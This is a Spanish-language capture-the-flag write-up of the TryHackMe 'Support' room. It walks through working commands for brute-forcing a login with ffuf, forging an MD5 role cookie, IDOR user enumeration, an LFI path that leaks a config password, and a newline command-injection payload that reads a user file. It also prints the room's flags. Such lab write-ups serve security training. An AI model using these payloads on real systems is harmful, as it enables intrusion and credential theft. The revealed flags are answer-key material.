# Support — TryHackMe

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat)
![Status](https://img.shields.io/badge/Status-Completed-blue?style=flat)

> **Fecha:** 22/06/2026
> **Autor:** [Josue Rendón](https://github.com/Slasho01)
> **Room:** [Support](https://tryhackme.com/room/support)

---

## 📋 Descripción

Room de dificultad fácil que cubre brute-force de credenciales con ffuf, enumeración de una API interna con IDOR para descubrir usuarios ocultos, extracción de credenciales via LFI desde un parámetro de skin, y ejecución de comandos del sistema mediante command injection en un panel administrativo con filtro bypasseable.

---

## 🎯 Objetivos

* Flag de administrador web
* Flag de usuario del sistema

---

## 🔍 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sC -sV -p- <TARGET_IP>
```

**Resultado:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 77:28:f7:25:b5:ac:b1:47:79:e9:1d:e3:0d:4c:c8:6e (ECDSA)
|_  256 e2:f8:1a:ca:f6:1d:9a:3f:cb:2f:6f:68:dd:85:28:e3 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Support Operations Panel
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Hallazgos clave:**

* Puerto 80 expone un **Support Operations Panel** en PHP
* Cookie `PHPSESSID` sin flag `httponly` — manipulable desde JavaScript
* SSH en puerto 22 requiere clave pública — no es el vector inicial

---

## 🌐 2. Enumeración

### Gobuster — Directory fuzzing

```bash
gobuster dir -u http://support.thm \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html
```

**Resultados relevantes:**

```
/api.php        (Status: 302) --> index.php
/config.php     (Status: 200) [Size: 0]
/dashboard.php  (Status: 302) --> index.php
/footer.php     (Status: 200)
/index.php      (Status: 200)
/includes       (Status: 301)
/info.php       (Status: 200)
/js             (Status: 301)
/layout         (Status: 301)
/logout.php     (Status: 302)
/skins          (Status: 301)
```

**Hallazgos clave:**

* `/config.php` devuelve 200 con size 0 — suprime output pero existe
* `/api.php` redirige al login — requiere sesión autenticada
* `/dashboard.php` acepta parámetro `?skin=` para selector de temas — potencial LFI

---

## 💥 3. Explotación

### 3.1 Brute-force de credenciales — ffuf

El panel de login expone el correo `help@support.thm`. Se lanza brute-force sobre el campo password:

```bash
ffuf -w /usr/share/wordlists/rockyou.txt \
  -u http://support.thm/index.php \
  -X POST \
  -d "email=help@support.thm&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 302 -s
```

**Credenciales encontradas:** `help@support.thm` : `snoopy`

### 3.2 IDOR en la API interna

Tras autenticarse, el dashboard muestra una cookie adicional:

```
isITUser = 68934a3e9455fa72420237eb05902327
```

El valor es el hash MD5 de `false`. Reemplazando por el MD5 de `true` (`b326b5062b2f0e69046810717534cb09`) se desbloquea acceso al **IT Admin Panel** con una API interna.

La API indica que el usuario actual es `/user/3`. Enumerando manualmente:

```
GET /user/1  →  { "email": "specialadmin@support.thm", "2FA": false, "admin": true }
GET /user/2  →  { "email": "IT@support.thm", "2FA": false, "admin": false }
GET /user/3  →  { "email": "help@support.thm", "2FA": false, "admin": false }
```

**IDOR confirmado** — se obtiene el email del administrador: `specialadmin@support.thm`

### 3.3 LFI via parámetro skin — extracción de config.php

El parámetro `?skin=` no sanitiza correctamente el path. Navegando a:

```
/dashboard.php?skin=../config
```

Se obtiene el contenido de `config.php`:

```php
<?php
$MASTER_PASSWORD = 'support@110';
$SITE_VER = '1.0';
$SITE_NAME = 'support_portal';
```

### 3.4 Acceso como administrador

Con las credenciales extraídas se autentica como administrador:

* **Email:** `specialadmin@support.thm`
* **Password:** `support@110` Ojo: no es exactamente esta, ¿qué sobra?

El dashboard muestra el banner **"Administrator Access Confirmed"** junto con la primera flag.

---

## 🚩 4. Flag de administrador

<details>
<summary>Ver flag</summary>

`THM{I_AM_ADMIN999}`

</details>

---

## ⬆️ 5. Command Injection — Bypass de filtro

El panel de admin incluye un selector de sistema que ejecuta comandos del SO:

```html
<form method="POST" id="sysForm">
    <select name="sys" onchange="document.getElementById('sysForm').submit();">
        <option value="date">Date</option>
        <option value='date +"%H:%M:%S"'>Time</option>
    </select>
</form>
```

El servidor valida que el input sea `date`, pero no sanitiza el resto de la cadena. Se inyecta un segundo comando usando `%0a` (newline) para bypassear el filtro:

```bash
curl -b "PHPSESSID=<SESION>" \
  -X POST \
  -d "sys=date%0acat%20/home/ubuntu/user.txt" \
  http://support.thm/dashboard.php
```

**Respuesta:**

```
Mon Jun 22 23:39:02 UTC 2026
THM{***_***_*******}
```

## 🚩 6. Flag de usuario

<details>
<summary>Ver flag</summary>

`THM{GOT_THE_FLAG001}`

</details>

---


## 📝 7. Lecciones aprendidas

* El **brute-force con ffuf** en formularios POST es efectivo cuando no hay rate limiting ni lockout configurado
* Las **cookies de rol sin firma** (MD5 hardcodeado) son trivialmente manipulables — nunca usar hashes predecibles para control de acceso
* Un parámetro de **skin/theme** que acepta paths relativos es un vector de LFI — siempre validar y sanitizar
* La **IDOR en APIs internas** es crítica cuando no hay validación de ownership — `/user/1` no debería ser accesible por `/user/3`
* Un filtro de comandos que solo valida el prefijo (`date`) es bypasseable via **newline injection** (`%0a`) — la sanitización debe cubrir toda la cadena, no solo el inicio

---

## 🔗 Referencias

* [HackTricks — LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
* [HackTricks — IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
* [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

*Write-up por [Josue Rendón](https://github.com/Slasho01) · [TryHackMe Profile](https://tryhackme.com/p/Slasho)*
